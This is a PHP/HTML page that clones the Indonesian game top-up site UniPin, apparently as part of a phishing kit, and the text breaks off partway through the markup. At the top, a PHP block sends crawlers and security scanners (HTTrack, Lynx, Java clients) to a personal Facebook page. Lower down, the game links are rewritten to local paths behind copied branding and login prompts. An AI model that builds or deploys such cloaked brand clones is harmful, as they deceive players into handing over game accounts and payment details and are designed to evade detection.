<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('https://web.facebook.com/MhmdDhanzGans');
die();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="yes" name="apple-mobile-web-app-capable"/>
    <meta name="viewport" content="minimum-scale=1.0, width=device-width, maximum-scale=1, user-scalable=no"/>

    <title>UniPin - Payment Gateway Game Terbesar &amp; Terfavorit</title>
    <meta name='application-name' content='UniPin'/>
    <meta name="copyright" content="&copy; 2019 by UniPin">
    <meta name='keywords' content="payment gateway, payment service provider, online game, indomaret, game credits, game cash ">
    <meta name='description' content="The fastest way to get game credits online!     Top up diamond, premium, beli voucher game online cepat dan murah free fire, mobile legends, ragnarok dan lainnya tanpa kartu kredit, bisa melalui gopay, Indomaret, Telkomsel, tri.
">
    <meta name="csrf-token" content="smYPfyn3QT1aijRgWsQoEXuxFM9rcrcsX2XObrDa">

        <link rel="manifest" href="https://www.unipin.com/js/manifest.json">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://www.unipin.com/images/unipin-square.png"/>
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://www.unipin.com/images/unipin-square.png"/>
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://www.unipin.com/images/unipin-square.png"/>
    <link rel="apple-touch-icon-precomposed" href="https://www.unipin.com/img/favicon.ico"/>
    <link rel="shortcut icon" sizes="196x196" href="https://www.unipin.com/img/favicon.ico"/>
    <link rel="shortcut icon" type="image/x-icon" href="https://www.unipin.com/img/favicon.ico"/>
    <link rel="icon" type="image/x-icon" href="https://www.unipin.com/img/favicon.ico"/>

    <meta property="og:url" content="https://www.unipin.com"/>
    <meta property="og:type" content="website"/>
    <meta property="og:title" content="UniPin UniPin - Voucher Game Online Termurah dan Cepat"/>
    <meta property="og:description" content="The fastest way to get game credits online!     Top up diamond, premium, beli voucher game online cepat dan murah free fire, mobile legends, ragnarok dan lainnya tanpa kartu kredit, bisa melalui gopay, Indomaret, Telkomsel, tri.
"/>
    <meta property="og:image" content="https://www.unipin.com/images/unipin-black-lg.png"/>

    <meta property="twitter:card" content="summary">
    <meta property="twitter:site" content="@unipin">
    <meta property="twitter:title" content="UniPin UniPin - Voucher Game Online Termurah dan Cepat"/>
    <meta property="twitter:description" content="The fastest way to get game credits online!     Top up diamond, premium, beli voucher game online cepat dan murah free fire, mobile legends, ragnarok dan lainnya tanpa kartu kredit, bisa melalui gopay, Indomaret, Telkomsel, tri.
"/>
    <meta property="twitter:image" content="https://www.unipin.com/images/unipin-black-lg.png"/>
    <meta property="twitter:url" content="https://www.unipin.com"/>

    <link href="css/app.v2.css?id=f94fa96a449ed2e042c6" rel="stylesheet" type="text/css"/>
    <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
        <style>
        .home-guide-topcaption{
            margin: 36px 15px;
            line-height: 1.6em;
            font-weight: 800;
            font-size: 20px;
        }
        @media (min-width: 480px) {
            .home-guide-topcaption {
                margin: 10px 0 20px 0;
                line-height: 1.6em;
                font-weight: 800;
                font-size: 22px;
            }
        }
    </style>

    
            <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-81857948-3"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-81857948-3');
</script>


<!-- Facebook Pixel Code -->

<!-- End Facebook Pixel Code -->    
</head>
<body class="drawer drawer--right">
        <div style='display:none' id='sbbhscc'></div>
          <script type="text/javascript">
            var sbbvscc='';
            var sbbgscc='';
            function genPid() {return String.fromCharCode(118)+String.fromCharCode(117) ; };
          </script>
        <div id='sbbfrcc' style='position: absolute; top: -10px; left: 30px; font-size:1px'></div>
  <script type="text/javascript">(function(XHR){var open=XHR.prototype.open;var send=XHR.prototype.send;var parser=document.createElement('a');XHR.prototype.open=function(method, url, async, user, pass){if(typeof async=='undefined'){async=true;}parser.href=url;if(parser.host==''){parser.href=parser.href;}this.ajax_hostname=parser.hostname;open.call(this, method, url, async, user, pass);};XHR.prototype.send=function(data){if(location.hostname==this.ajax_hostname)this.setRequestHeader("X-MOD-SBB-CTYPE", "xhr");send.call(this, data);}})(XMLHttpRequest);if(typeof(fetch)!="undefined"){var nsbbfetch=fetch;fetch=function(url, init){if(typeof(url)==="object" && typeof(url.url)==="string"){url=url.url;}function sbbSd(url, domain){var parser=document.createElement('a');parser.href=url;if(parser.host==''){parser.href=parser.href;}return parser.hostname==location.hostname;}if(sbbSd(url, document.domain)){init=typeof init !=='undefined' ? init :{};if(typeof(init.headers)==="undefined"){init.headers={};}init.headers['X-MOD-SBB-CTYPE']='fetch';}return nsbbfetch(url, init);};}function sbbgc(check_name){var start=document.cookie.indexOf(check_name+"=");var oVal='';var len=start+check_name.length+1;if((!start)&&(document.cookie.substring(0,check_name.length)!=check_name)){oVal='';}else if(start==-1){oVal='';}else{var end=document.cookie.indexOf(';',len);if(end==-1)end=document.cookie.length;var oVal=document.cookie.substring(len,end);};return oVal;}function addmg(inm,ext){var primgobj=document.createElement('IMG');primgobj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+"/sbbi/?sbbpg="+inm+(ext?"&"+ext:"");var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(primgobj);};function addprid(prid){var oldVal=sbbgc("PRLST");if((oldVal.indexOf(prid)==-1)&&(oldVal.split('/').length<5)){if(oldVal!='')oldVal+='/';document.cookie='PRLST='+oldVal+escape(prid)+';path=/';}}var sbbeccf=function(){this.sp3="jass";this.sf1=function(vd){return sf2(vd)+32;};var sf2=function(avd){return avd*12;};this.sf4=function(yavd){return yavd+2;};var strrp=function(str, key, value){if(str.indexOf('&'+key+'=')> -1 || str.indexOf(key+'=')==0){var idx=str.indexOf('&'+key+'=');if(idx==-1)idx=str.indexOf(key+'=');var end=str.indexOf('&', idx+1);var newstr;if(end !=-1)newstr=str.substr(0, idx)+str.substr(end+(idx ? 0 : 1))+'&'+key+'='+value;else newstr=str.substr(0, idx)+'&'+key+'='+value;return newstr;}else return str+'&'+key+'='+value;};var strgt=function(name, text){if(typeof text !='string')return "";var nameEQ=name+"=";var ca=text.split(/[;&]/);for(var i=0;i < ca.length;i++){var c=ca[i];while(c.charAt(0)==' ')c=c.substring(1, c.length);if(c.indexOf(nameEQ)==0)return c.substring(nameEQ.length, c.length);}return "";};this.sfecgs={sbbgh:function(){var domain=document.location.host;if(domain.indexOf('www.')==0)domain=domain.replace('www.', '');return domain;}, f:function(name, value){var fv="";if(window.globalStorage){var host=this.sbbgh();try{if(typeof(value)!="undefined")globalStorage[host][name]=value;else{fv=globalStorage[host][name];if(typeof(fv.toString)!="undefined")fv=fv.toString();}}catch(e){}}return fv;}, name:"sbbrf"};this.sfecls={f:function(name, value){var fv="";try{if(window.localStorage){if(typeof(value)!="undefined")localStorage.setItem(name, value);else{fv=localStorage.getItem(name);if(typeof(fv.toString)!="undefined")fv=fv.toString();}}}catch(e){}return fv;}, name:"sbbrf"};this.sbbcv=function(invl){try{var invalArr=invl.split("-");if(invalArr.length>1){if(invalArr[0]=="A"||invalArr[0]=="D"){invl=invalArr[1];}else invl="";}if(invl==null||typeof(invl)=="undefined"||invl=="falseImgUT"||invl=="undefined"||invl=="null"||invl!=encodeURI(invl))invl="";if(typeof(invl).toLowerCase()=="string")if(invl.length>20)if(invl.substr(0,2)!="h4")invl="";}catch(ex){invl="";}return invl;};this.sbbsv=function(fv){for(var elm in this){if(this[elm].name=="sbbrf"){this[elm].f("altutgv2",fv);}}document.cookie="UTGv2="+fv+';expires=Tue, 31 Dec 2030 00:00:00 UTC;path=/';};this.sbbgv=function(){var valArr=Array();var currVal="";for(var elm in this){if(this[elm].name=="sbbrf"){currVal=this[elm].f("altutgv2");currVal=this.sbbcv(currVal);if(currVal!="")valArr[currVal]=(typeof(valArr[currVal])!="undefined"?valArr[currVal]+1:1);}}var lb=0;var fv="";for(var val in valArr){if(valArr[val]>lb){fv=val;lb=valArr[val]}}if(fv=="")fv=sbbgc("UTGv2");fv=this.sbbcv(fv);if(fv!="")this.sbbsv(fv);else this.sbbsv("h40005ed321b7d394e641c41eb5abfb64060");return fv;};};function m2vr(m1,m2){var i=0;var rc="";var est="ghijklmnopqrstuvwyz";var rnum;var rpl;var charm1=m1.charAt(i);var charm2=m2.charAt(i);while(charm1!=""||charm2!=""){rnum=Math.floor(Math.random()* est.length);rpl=est.substring(rnum,rnum+1);rc+=(charm1==""?rpl:charm1)+(charm2==""?rpl:charm2);i++;charm1=m1.charAt(i);charm2=m2.charAt(i);}return rc;}function sbbls(prid){try{var eut=sbbgc("UTGv2");window.sbbeccfi=new sbbeccf();window.sbbgs=sbbeccfi.sbbgv();if(eut!=sbbgs && sbbgs!="" && typeof(sbbfcr)=="undefined"){addmg('utMedia',"vii="+m2vr("64b2185a2cdf981269dfef7880240235",sbbgs));}var sbbiframeObj=document.createElement('IFRAME');var dfx=new Date();sbbiframeObj.id='SBBCrossIframe';sbbiframeObj.title='SBBCrossIframe';sbbiframeObj.tabindex='-1';sbbiframeObj.lang='en';sbbiframeObj.style.visibility='hidden';sbbiframeObj.setAttribute('aria-hidden', 'true');sbbiframeObj.style.border='0px';if(document.all){sbbiframeObj.style.position='absolute';sbbiframeObj.style.top='-1px';sbbiframeObj.style.height='1px';sbbiframeObj.style.width='28px';}else{sbbiframeObj.style.height='1px';sbbiframeObj.style.width='0px';}sbbiframeObj.scrolling="NO";sbbiframeObj.src=window.location.protocol+"//"+window.location.hostname+(window.location.port && window.location.port!=80 ? ':'+window.location.port: '')+'/sbbi/?sbbpg=sbbShell&gprid='+prid+'';var sbbDiv=document.getElementById('sbbfrcc');sbbDiv.appendChild(sbbiframeObj);}catch(ex){;}}try{var y=unescape(sbbvscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));document.getElementById('sbbhscc').innerHTML=y;var x=unescape(sbbgscc.replace(/^<\!\-\-\s*|\s*\-\->$/g,''));}catch(e){x='function genPid(){return "jser";}';}try{if(window.gprid==undefined)document.write('<'+'script type="text/javascri'+'pt">'+x+"var gprid=genPid();addprid(gprid);var sbbfcr=true;sbbls(gprid);<"+"/script>");}catch(e){addprid("dwer");}</script>
<!-- Begin language section -->
<div id="language-dropdown-container">
    <div class="container">
        <div class="row">
            <div class="language-dropdown-inner-container col-xs-12 col-md-offset-1 col-md-10 col-lg-offset-2 col-lg-8">
                <div class="language-close-button-container">
                    <div class="language-close-button language-dropdown-trigger">
                        <i class="c-grey fa fa-times"></i>
                    </div>
                </div>
                <div class="language-region-container">
                    <p class="c-orange h4">Wilayah yang tersedia</p>

                                                                        <a title="Indonesia" href="https://www.unipin.com/region/IDR" class="language-region-choose link-grey label-link">
                                <img class="language-dropdown-countryicon" src="https://storage.googleapis.com/unipin-assets/images/flags/360.png"/>
                            </a>
                                                    <a title="Malaysia" href="https://www.unipin.com/region/MYR" class="language-region-choose link-grey label-link">
                                <img class="language-dropdown-countryicon" src="https://storage.googleapis.com/unipin-assets/images/flags/458.png"/>
                            </a>
                                                    <a title="Philippines" href="https://www.unipin.com/region/PHP" class="language-region-choose link-grey label-link">
                                <img class="language-dropdown-countryicon" src="https://storage.googleapis.com/unipin-assets/images/flags/608.png"/>
                            </a>
                                                    <a title="Myanmar" href="https://www.unipin.com/region/MMK" class="language-region-choose link-grey label-link">
                                <img class="language-dropdown-countryicon" src="https://storage.googleapis.com/unipin-assets/images/flags/104.png"/>
                            </a>
                                                                
                </div>
                <div class="language-choice-container">
                                            <p class="c-orange h4">Bahasa Website</p>
                                                    <a class="label-link" href="https://www.unipin.com/language/id">
                                <div class="orange-label h5">ID</div>
                            </a>
                                                    <a class="label-link" href="https://www.unipin.com/language/en">
                                <div class="grey-label h5">EN</div>
                            </a>
                                                            </div>
            </div>
        </div>
    </div>
</div>
<!-- END - Language section -->

<header role="banner">
    <button type="button" class="drawer-toggle drawer-hamburger">
        <span class="sr-only">toggle navigation</span>
        <!-- <span class="drawer-hamburger-icon"></span> -->
        <div class="drawer-close-button">
            <i class="drawer-close-icon fa fa-times"></i>
        </div>
    </button>
    <nav class="drawer-nav" role="navigation">
        <ul class="drawer-menu">
            <li>
                <!-- uncomment sign in button below to see Guest mode -->
                                <a class="drawer-menu-item" href="#" data-target="#login_modal" data-toggle="modal">
                  <button class="btn btn-up-orange btn-block">Masuk / Daftar</button>
                </a>
                                <hr/>
            </li>
                        <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/games/flash-topup/all">
                    <img class="drawer-icon" src="img/drawericon/drawco_flashtopup.svg">
                    Flash Top Up
                </a>
            </li>
            <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/games/voucher-purchase/all">
                    <img class="drawer-icon" src="img/drawericon/drawco_voucher.svg">
                    Pembelian Voucher
                </a>
            </li>
            <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/games/other-games">
                    <img class="drawer-icon" src="img/drawericon/drawco_othergame.svg">
                    Game Lain
                </a>
            </li>
            <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/services/how-it-work">
                    <img class="drawer-icon" src="img/drawericon/drawco_howto.svg">
                    Cara Menggunakan (F.A.Q)
                </a>
            </li>
            <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/support">
                    <img class="drawer-icon" src="img/drawericon/drawco_support.svg">
                    Customer Support
                </a>
            </li>
            <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/rewards">
                    <img class="drawer-icon" src="img/drawericon/drawco_reward.svg">
                    Hadiah
                </a>
            </li>
            
            <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/article">
                    <img class="drawer-icon" src="img/drawericon/drawco_promo.svg">
                    Berita &amp; Promo
                </a>
            </li>
            <li>
                <a class="drawer-menu-item" href="https://corp.unipin.com" target="_blank">
                    <img class="drawer-icon" src="img/drawericon/drawco_corporate.svg">
                    Corporate
                </a>
            </li>
                        <li>
                <a class="drawer-menu-item" href="https://www.unipin.com/services/payment-channels">
                    <img class="drawer-icon" src="img/drawericon/drawco_channel.svg">
                    Channel Pembayaran
                </a>
            </li>
            
            
        </ul>
    </nav>
</header>

<div class="searchbar-outter-container">
    <div class="container">
        <div class="row">
            <div class="col-md-offset-1 col-md-10 col-lg-offset-2 col-lg-8">
                <div class="row">
                    <div id="searchbar-container">
                        <form id="search-form"  method="get" action="https://www.unipin.com/games/search">
                            <div class="input-group">
                                <input type="text" class="form-control" name="search" value=""
                                       placeholder="Judul Game" id="search_input">
                                <span class="input-group-btn">
                                <button class="searchbar-button btn btn-up-orange" type="submit">
                                  <i class="c-white fa fa-search"></i>
                                </button>
                                <button class="searchbar-trigger btn searchbar-close-button" type="button">
                                  <i class="c-grey fa fa-times"></i>
                                </button>
                              </span>
                            </div>
                        </form>
                        <!-- /input-group -->
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="topbar">
    <div class="container">
        <div class="row">
            <div class="col-lg-offset-1 col-lg-10">
                <div id="bar-container">
                    <div class="top-menu top-menu-left">
                        <div class="searchbar-trigger topbar-item-container">
                            <i class="c-orange topbar-fa-icon fa fa-search"></i>
                        </div>
                    </div>
                    <div class="top-menu top-menu-right">
                        <div class="topbar-item-container">
                            <span class="language-dropdown-trigger"  data-name="Indonesia">
                              <p class="c-grey topbar-desktop-language">
                                <b>Indonesia - ID</b>
                              </p>
                              <div class="topbar-language-icon">
                                <img src="https://storage.googleapis.com/unipin-assets/images/flags/360.png">
                                <div class="topbar-mobile-language c-grey">
                                  <b></b>
                                </div>
                              </div>
                            </span>
                                                            <span>
                                    <a href="#" class="topbar-desktop-loginbutton hidden-xs btn btn-up-orange" data-target="#login_modal" data-toggle="modal">Masuk / Daftar</a>
                                </span>
                                <span class="drawer-toggle">
                                    <i class="c-orange topbar-fa-icon fa fa-bars drawer-toggle"></i>
                                </span>
                            
                            
                        </div>
                    </div>
                    <div class="text-center top-menu-center">
                        <a href="/">
                            <img class="unipin-logo" src="https://www.unipin.com/images/unipin-new.png">
                        </a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="topbar-offset"></div>
<input type="hidden" id="baseURL" value="https://www.unipin.com">
<div class="pageLoader"></div>
<div class="majorWrap">
    <div id="ajaxArea">
                            
        <main role="main">
                <div class="container">
        <div class="row">
            <div class="col-lg-offset-1 col-lg-10 nopadding">
                <section>
                    
                        <div class="flexslider">
                            <ul class="slides">
                                                                                                            <li>
                                            <a href="./"><img src="img/banner-1.jpg" /></a>
                                        </li>
                                                                                                                                                <li>
                                            <a href="./"><img src="img/banner-2.jpg" /></a>
                                        </li>
                                                                                                                                                <li>
                                            <a href="./"><img src="img/banner-3.jpg" /></a>
                                        </li>
                                                                                                                                                <li>
                                            <a href="./"><img src="img/banner-4.png" /></a>
                                        </li>
                                                                                                                                                <li>
                                            <a href="./"><img src="img/banner-5.jpg" /></a>
                                        </li>
                                                                                                                                                <li>
                                    </ul>
                        </div>

                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                        
                    
                    
                        
                            
                                
                                    
                                        
                                            
                                                
                                                    
                                                
                                                
                                            
                                        
                                    
                                
                            
                        
                    
                </section>
            </div>

            <div class="col-lg-offset-1 col-lg-10">
                <section>
                                            <div class="font-primary text-center">
                            <div class="col-xs-12">
                                <h2 class="text-uppercase">Flash Top Up</h2>
                            </div>
                        </div>
                        <div class="row">
                            <div class="feature-box-container">
                                <div id="featured-box">
                                                                            <div class="card-sizer"><div class="card"><a href="garena/free-fire" class="link-plain-f " ><img src="img/ff.jpg" alt="Free Fire" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Free Fire">Free Fire<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Garena<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="garena/codm" class="link-plain-f " ><img src="img/codm.jpg" alt="Free Fire" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Free Fire">Call of Duty Mobile<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Garena<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="topup/ml" onclick="channel_maintaining();" class="link-plain-f " ><img src="img/ml.jpg" alt="Mobile Legends: Bang Bang" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Mobile Legends: Bang Bang">Mobile Legends: Bang Bang<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Moonton<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();" class="link-plain-f " ><img src="img/rm.jpg" alt="Ragnarok M: Eternal Love" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Ragnarok M: Eternal Love">Ragnarok M: Eternal Love<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Gravity<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"pointblank" class="link-plain-f " ><img src="img/pb.jpg" alt="Point Blank" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Point Blank">Point Blank<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Zepetto<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"garena/aov" class="link-plain-f " ><img src="img/aov.jpg" alt="Arena of Valor" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Arena of Valor">Arena of Valor<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Garena<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"youzu/saint-seiya" class="link-plain-f " ><img src="img/ss.jpg" alt="Saint Seiya" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Saint Seiya">Saint Seiya<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>GTarcade<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"kingofkings" class="link-plain-f " ><img src="img/kok.jpg" alt="King of Kings" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="King of Kings">King of Kings<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Zloong<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"garena/speed-drifters" class="link-plain-f " ><img src="img/sd.jpg" alt="Speed Drifters" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Speed Drifters">Speed Drifters<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Garena<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"laplacem" class="link-plain-f " ><img src="img/lp.jpg" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Laplace M">Laplace M<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Zlong<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"bleach" class="link-plain-f " ><img src="img/bm.jpg" alt="BLEACH Mobile 3D" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="BLEACH Mobile 3D">BLEACH Mobile 3D<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Koram<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"rules-of-survival/pc" class="link-plain-f " ><img src="img/ros.jpg" alt="Rules Of Survival: Bertahan Hidup" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Rules Of Survival: Bertahan Hidup">Rules Of Survival: Bertahan Hidup<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>VNG RoS<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"dragonnest-m" class="link-plain-f " ><img src="img/dn.jpg" alt="Dragon Nest M - SEA" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Dragon Nest M - SEA">Dragon Nest M - SEA<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Koram<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"rules-of-survival/mobile" class="link-plain-f " ><img src="img/rosy.jpg" alt="Rules Of Survival: Yang Terakhir Hidup" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Rules Of Survival: Yang Terakhir Hidup">Rules Of Survival: Yang Terakhir Hidup<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>VNG RoS Mobile<span class="paragraph-end"></span></b></div></div></div></a></div>

                                                                            
                                                                    </div>
                            </div>
                        </div>
                                    </section>

                <section>
                                            <header class="font-primary text-center">
                            <div class="col-xs-12">
                                <h2 class="text-uppercase">Pembelian Voucher</h2>
                            </div>
                        </header>
                        <div class="row">
                            <div class="feature-box-container">
                                <div id="featured-box">
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"game/detail/159/kode-voucher-google-play" class="link-plain-f " ><img src="img/kvgp.jpg" alt="Kode Voucher Google Play" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Kode Voucher Google Play">Kode Voucher Google Play<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Google Play<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"game/detail/246/playerunknowns-battlegrounds-pubg-pc" class="link-plain-f " ><img src="img/pubgpc.jpg" alt="PLAYERUNKNOWN’S BATTLEGROUNDS (PUBG PC)" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="PLAYERUNKNOWN’S BATTLEGROUNDS (PUBG PC)">PLAYERUNKNOWN’S BATTLEGROUNDS (PUBG PC)<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>PUBG Corporation<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"game/detail/249/steam-wallet-code-id" class="link-plain-f " ><img src="img/swc.jpg" alt="Steam Wallet Code (ID)" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Steam Wallet Code (ID)">Steam Wallet Code (ID)<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Steam (ID)<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"game/detail/189/minecraft" class="link-plain-f " ><img src="img/mojang.jpg" alt="Minecraft" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Minecraft">Minecraft<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Mojang<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                            <div class="card-sizer"><div class="card"><a href="javascript:void(0)" onclick="channel_maintaining();"game/detail/278/steam-wallet-code-us" class="link-plain-f " ><img src="img/swc.jpg" alt="Steam Wallet Code (US)" /><div class="card-description"><div class="card-caption-1 c-orange card-title bold" title="Steam Wallet Code (US)">Steam Wallet Code (US)<span class="paragraph-end"></span></div><div class="card-caption-2 c-grey"><b>Steam US<span class="paragraph-end"></span></b></div></div></div></a></div>
                                                                    </div>
                            </div>
                        </div>
                                        <header class="text-center">
                        <div>
                            <a href="./" class="btn btn-thumb-friendly btn-up-orange btn-block" style="text-decoration: none;">Lihat semua</a>
                        </div>
                    </header>
                </section>
            </div>
        </div>
    </div>

        <div class="bg-grey3 home-guide-outtermost-container">
            <div class="container">
                <div class="row">
                    <h1 class="h4 c-orange text-center home-guide-topcaption">
                        Top-up atau Beli item game, termurah dan tercepat di UniPin.com
                    </h1>
                </div>
                <div class="row">
                    <section>
                        <div class="home-guide-container col-xs-12 col-sm-4 mb-15">
                            <div class="home-guide-image">
                                <img class="home-guide-image" src="img/homepage_guide1.svg">
                            </div>
                            <div style="display: flex;flex-direction: column;justify-content: center; flex:1; margin-left: 15px;">
                                <h2 class="h4 c-orange">1. Top Up Game Favoritmu</h2>
                                <div class="c-grey home-guide-description">
                                    Jutaan gamer memilih UniPin! Top Up game terlengkap seperti Mobile Legends, Free Fire, Ragnarok M, AOV, Speed Drifter, dan game lainnya!
                                </div>
                            </div>
                        </div>

                        <div class="home-guide-container col-xs-12 col-sm-4 mb-15">
                            <div class="home-guide-image">
                                <img src="img/homepage_guide2.svg">
                            </div>
                            <div style="display: flex;flex-direction: column;justify-content: center; flex:1; margin-left: 15px;">
                                <h2 class="h4 c-orange">2. Pilih Nominal dan Bayar</h2>
                                <div class="c-grey home-guide-description">
                                    Top Up praktis dan promo menarik. Pilihan lengkap bisa bayar melalui GO-PAY, Telkomsel, OVO, BCA, Indomaret, Alfamart, Kartu Kredit, dll!
                                </div>
                            </div>
                        </div>

                        <div class="home-guide-container col-xs-12 col-sm-4 mb-15">
                            <div class="home-guide-image">
                                <img src="img/homepage_guide3.svg">
                            </div>
                            <div style="display: flex;flex-direction: column;justify-content: center; flex:1; margin-left: 15px;">
                                <h2 class="h4 c-orange">3. Dapatkan Item / Voucher</h2>
                                <div class="c-grey home-guide-description">
                                    Item / Voucher dikirimkan instan ke kamu dan Customer support 24 jam siap melayani!
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
        </div>

    <div class="container">
        <div class="row">
            <div class="col-lg-10 col-lg-offset-1">
                <section>
                    <header class="font-primary text-center">
                        <div class="row">
                            <div class="col-xs-12">
                                <h2 class="h2 c-orange text-center text-uppercase">Berita dan Promo</h2>
                            </div>
                        </div>
                    </header><!--section header-->

                    <div class="row">
                        <div class="news-item-container c-grey">
                                                            <div class="news-item-sizer">
                                    <div class="news-item">
                                        
                                        <a class="link-plain-f link-grey link-inline-block" href="https://www.unipin.com/article/detail/event/2019-07-19/top-up-now-and-get-70-bonus-uc">
                                            <img class="news-item-banner-img" src="https://storage.googleapis.com/unipin-assets/images/thumbnail_pages/1563511684-480x130-960x320.jpg" alt="Top Up Now and get 70% bonus UC"/>
                                        </a>
                                        <div class="news-item-caption-container">
                                            <p class="news-item-caption">
                                                <b><a href="https://www.unipin.com/article/detail/event/2019-07-19/top-up-now-and-get-70-bonus-uc">Top Up Now and get 70% bonus UC</a></b>
                                            </p>
                                            <span>19 Jul 2019</span>
                                            <p class="news-item-caption-description c-grey2">
                                                
                                                <span class="paragraph-end"></span>
                                            </p>
                                        </div>

                                        <div class="news-item-bottom">
